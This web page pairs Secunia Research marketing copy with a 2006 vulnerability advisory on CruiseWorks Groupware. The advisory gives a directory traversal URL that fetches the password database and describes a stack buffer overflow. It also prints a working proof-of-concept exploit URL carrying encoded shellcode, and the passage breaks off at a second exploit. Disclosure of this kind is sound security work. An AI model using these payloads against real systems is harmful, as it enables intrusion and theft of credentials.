How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

| [vuln.sg](/)      | vuln.sg Vulnerability Research Advisory | | --- | | CruiseWorks Directory Traversal and Buffer Overflow Vulnerabilities by Tan Chew Keong Release Date: 2006-10-24  [[en](cruiseworks109d-en.html)] [[jp](cruiseworks109d-jp.html)]  **Summary** Two vulnerabilities have been found in [CruiseWorks](http://www.kynos.co.jp/cruise/cws/home.shtml). When exploited, the vulnerabilities allow an authenticated user to retrieve arbitrary files accessible to the web server process and to execute arbitrary code with privileges of the IIS IUSR\_MACHINE account.   **Tested Versions** CruiseWorks Groupware version 1.09c and 1.09d.   **Details** This advisory discloses two vulnerabilities in CruiseWorks Groupware. 1) CruiseWorks cws.exe "doc" Parameter Directory Traversal CruiseWorks does not properly validate the "doc" parameter in "/scripts/cruise/cws.exe" before using it to retrieve files for display. This allows a malicious user to disclose the content of arbitrary files accessible to the web server process using directory traversal characters.   **Example (to retrieve the system database that contains passwords, requires logon):**  http://192.168.1.111/Scripts/cruise/cws.exe?doc=../data/system.wdb  NOTE: Users passwords are stored in the "/scripts/cruise/data/system.wdb" file. This file is within the accessible "/scripts/cruise" directory. However, in a properly hardened server, the IIS read permission is probably removed from the "/scripts/cruise/data" directory. Using this vulnerability it is possible to retrieve the file.      2) CruiseWorks cws.exe "doc" Parameter Buffer Overflow CruiseWorks does not properly validate the "doc" parameter in "/scripts/cruise/cws.exe" before using it to construct a path using the "sprintf()" function. This allows a malicious user to cause a stack-based buffer overflow and to execute code with privileges of the IIS IUSR\_MACHINE account.   **The vulnerability exists in cws.exe in a function that resembles the following:**  ```  function_42AED0(char *valueOfDocParam) { 	char overflowedBuffer[0x200];				// 512 bytes 	 	... 	... 	... 	 	// Buffer overflow occurs when length of "doc" parameter > 512 bytes!!! 	// Approximately 529 bytes is needed to overwrite saved EIP.  	sprintf(overflowedBuffer, "%s\\docs\\%s", getScriptDirectory(), valueOfDocParam); 	... 	... }  ```  ---   **For Example:** ```  http://192.168.1.111/Scripts/cruise/cws.exe?doc=AAAAAAAAAA..[Approx. 529 bytes]..AAAAAAAAA  ```  **Testing Notes**  The buffer overflow vulnerability exists in cws.exe which is executed by IIS or other webserver as an external CGI process when a HTTP request is received. By supplying an overly long value to the **"doc"** parameter, cws.exe will crash.  However, it is trickly to observe the buffer overflow since cws.exe will crash silently without activating the "Just In Time Debugger", and there is no time to manually attach Ollydbg to the cws.exe process before it crashes. For more information on how to observe and test the buffer overflow, see this [page](cruiseworks109info-en.html).  **POC Exploit**  The following POC will exploit the vulnerability to create files in the "\windows\temp\" or "\winnt\temp\" directory. It has been tested to work on English WinXP SP2 and Japanese Win2K SP4.  NOTE: The shellcode will also sound the speaker continuously.   Copy-and-paste this entire request to the browser addressbar after you logon to CruiseWorks. Remember to change the IP address  **Example Exploit 1 (requires logon):**  Note: Exploit 1 uses address of JMP ESI in ntdll.dll to return into the shellcode.  ```  http://192.168.1.111/Scripts/cruise/cws.exe?doc=%90%EB%5E%60%8B%5C%24%28%8B%73%3C%8B%74%33%78%03%F3%8B%7E %20%03%FB%8B%4E%18%56%33%D2%8B%37%03%74%24%2C%33%DB%33%C0%AC%85%C0%74%09%C1%CB%0C%D1%CB%03%D8%EB%F0%3B%5C %24%28%74%0B%83%C7%04%42%E2%DC%5E%33%C0%EB%1A%5E%8B%7E%24%03%7C%24%28%66%8B%04%57%8B%7E%1C%03%7C%24%28%8B %04%87%01%44%24%28%61%C3%8B%EC%33%C9%B1%C8%2B%E1%B1%30%64%8B%01%8B%40%0C%8B%70%1C%AD%8B%78%08%57%68%33%CA %8A%5B%E8%80%FF%FF%FF%58%58%33%C9%66%B9%90%01%2B%E1%54%51%FF%D0%8B%F4%03%F0%C7%06%41%41%41%41%C7%46%04%42 %42%42%42%C7%46%08%42%42%42%42%33%DB%89%5E%0C%33%C9%B1%14%B8%01%01%01%01%01%46%08%51%57%BB%A5%17%FF%7C%33 %C0%B0%FF%C1%E0%10%33%D8%53%E8%33%FF%FF%FF%58%58%33%DB%59%8B%D4%51%53%53%6A%02%53%53%53%52%FF%D0%59%E2%CD %57%68%8E%4E%0E%EC%E8%13%FF%FF%FF%58%58%BB%AA%AA%6C%6C%C1%EB%10%53%68%33%32%2E%64%68%75%73%65%72%54%FF%D0 %8B%F0%56%68%57%A0%B5%BB%E8%EE%FE%FF%FF%58%58%6A%FF%FF%D0%57%68%B0%49%2D%DB%E8%DD%FE%FF%FF%58%58%33%DB%66 %BB%E8%03%53%FF%D0%EB%D7%57%68%7E%D8%E2%73%E8%C5%FE%FF%FF%58%58%FF%D0%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%63%15%f8%77%41%7C%3E%90%7C  ```  **Example Exploit 2 (requires logon):**  Note: Exploit 2 uses address of CALL ESI in cws.exe to return into the shellcode.
